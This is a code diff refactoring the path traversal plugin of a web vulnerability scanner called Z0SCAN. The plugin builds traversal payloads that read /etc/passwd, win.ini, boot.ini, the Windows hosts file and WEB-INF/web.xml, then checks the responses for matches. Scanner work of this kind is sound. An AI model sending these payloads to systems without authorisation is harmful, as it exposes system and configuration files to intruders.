@@ -8,12 +8,12 @@ import re
 from urllib.parse import unquote, quote
 from lib.core.log import logger
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from api import generateResponse, updateJsonObjectFromStr, conf, KB, PLACE, OS, WEB_PLATFORM, VulType, POST_HINT, ResultObject, PluginBase, Type
+from api import generateResponse, updateJsonObjectFromStr, conf, KB, PLACE, VulType, POST_HINT, ResultObject, PluginBase, Type
 from lib.core.settings import DEFAULT_GET_POST_DELIMITER, DEFAULT_COOKIE_DELIMITER
 
 
 class Z0SCAN(PluginBase):
-    name = "PathTrave"
+    name = "trave-path"
     desc = 'Path Traversal'
 
     def condition(self):
@@ -26,16 +26,16 @@ class Z0SCAN(PluginBase):
         default_extension = ".jpg"
         payloads.append("../../../../../../../../../../../etc/passwd%00")
         payloads.append("/etc/passwd")
-        if OS.LINUX in self.response.os or OS.DARWIN in self.response.os:
+        if "LINUX" in self.response.os or"DARWIN" in self.response.os:
             payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")))
             payloads.append("../../../../../../../../../../etc/passwd{}".format(unquote("%00")) + default_extension)
-        if OS.WINDOWS in self.response.os:
+        if "WINDOWS" in self.response.os:
             payloads.append("../../../../../../../../../../windows/win.ini")
             payloads.append("C:\\boot.ini")
             # if origin:
             #     payloads.append(dirname + "/../../../../../../../../../../windows/win.ini")
             payloads.append("C:\\WINDOWS\\system32\\drivers\\etc\\hosts")
-        if WEB_PLATFORM.JAVA in self.response.programing:
+        if "JAVA" in self.response.programing:
             payloads.append("/WEB-INF/web.xml")
             payloads.append("../../WEB-INF/web.xml")
         return payloads
@@ -74,12 +74,12 @@ class Z0SCAN(PluginBase):
                     try:
                         future.result()
                     except Exception as task_e:
-                        logger.error(f"Task failed: {task_e}", origin="PathTrave")
+                        logger.error(f"Task failed: {task_e}", origin=self.name)
                         raise
             except KeyboardInterrupt:
                 executor.shutdown(wait=False)
             except Exception as e:
-                logger.error(f"Unexpected error: {e}", origin="PathTrave")
+                logger.error(f"Unexpected error: {e}", origin=self.name)
                 executor.shutdown(wait=False)
                 
     def process(self, _, payloads, plainArray, regexArray):
@@ -93,14 +93,14 @@ class Z0SCAN(PluginBase):
             for plain in plainArray:
                 if plain in html1:
                     result = ResultObject(self)
-                    result.init_info(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.PATH_TRAVERSAL, position, param=k, payload=payload)
-                    result.add_detail("Request", r.reqinfo, generateResponse(r), "Payload: {} Match: {}".format(payload, plain))
+                    result.main(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.PATH_TRAVERSAL, position, param=k, payload=payload)
+                    result.step("Request", r.reqinfo, generateResponse(r), "Payload: {} Match: {}".format(payload, plain))
                     self.success(result)
                     return
             for regex in regexArray:
                 if re.search(regex, html1, re.I | re.S | re.M):
                     result = ResultObject(self)
-                    result.init_info(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.PATH_TRAVERSAL, position, param=k, payload=payload)
-                    result.add_detail("Request", r.reqinfo, generateResponse(r), "Payload: {} Match: {}".format(payload, regex))
+                    result.main(Type.REQUEST, self.requests.hostname, self.requests.url, VulType.PATH_TRAVERSAL, position, param=k, payload=payload)
+                    result.step("Request", r.reqinfo, generateResponse(r), "Payload: {} Match: {}".format(payload, regex))
                     self.success(result)
                     return
